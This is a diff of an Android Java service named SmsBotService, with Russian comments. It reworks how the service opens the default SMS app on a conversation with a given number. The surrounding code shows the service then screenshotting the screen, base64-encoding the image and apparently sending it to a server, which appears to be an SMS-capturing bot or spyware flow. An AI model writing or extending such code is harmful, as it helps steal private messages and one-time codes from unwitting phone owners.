@@ -9,6 +9,7 @@ import android.media.ImageReader;
 import android.media.projection.*;
 import android.net.Uri;
 import android.os.*;
+import android.provider.Telephony;
 import android.telephony.*;
 import android.util.*;
 import android.view.*;
@@ -92,9 +93,9 @@ public class SmsBotService extends Service {
 
         String screenshotBase64 = null;
         if (status.equals("success")) {
-            // Открываем переписку с конкретным номером
-            openSmsConversation(phone);
-            Thread.sleep(2000);
+            // Открываем диалог с конкретным номером в стандартных Сообщениях
+            openSmsDialog(phone);
+            Thread.sleep(2500);
 
             byte[] screen = takeScreenshot();
             if (screen != null) {
@@ -121,19 +122,45 @@ public class SmsBotService extends Service {
         updateConn.getResponseCode();
     }
 
-    private void openSmsConversation(String phone) {
-        // Открыть стандартное приложение Сообщения с конкретным номером
+    private boolean openSmsDialog(String phone) {
         try {
             Intent intent = new Intent(Intent.ACTION_VIEW);
             intent.setData(Uri.parse("sms:" + phone));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
+            return true;
         } catch (Exception e) {
-            // Если не получилось — открываем просто Сообщения
-            Intent intent = new Intent(Intent.ACTION_MAIN);
-            intent.addCategory(Intent.CATEGORY_APP_MESSAGING);
+            e.printStackTrace();
+            // Fallback: просто открыть приложение Сообщения
+            return openDefaultSmsApp();
+        }
+    }
+
+    private boolean openDefaultSmsApp() {
+        try {
+            Intent intent;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                String defaultSmsPackage = Telephony.Sms.getDefaultSmsPackage(this);
+                if (defaultSmsPackage != null) {
+                    intent = getPackageManager().getLaunchIntentForPackage(defaultSmsPackage);
+                } else {
+                    intent = new Intent(Intent.ACTION_MAIN);
+                    intent.addCategory(Intent.CATEGORY_APP_MESSAGING);
+                }
+            } else {
+                intent = new Intent(Intent.ACTION_MAIN);
+                intent.addCategory(Intent.CATEGORY_APP_MESSAGING);
+            }
+            if (intent == null) {
+                intent = new Intent(Intent.ACTION_MAIN);
+                intent.addCategory(Intent.CATEGORY_APP_MESSAGING);
+            }
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
+            return true;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return false;
         }
     }
 
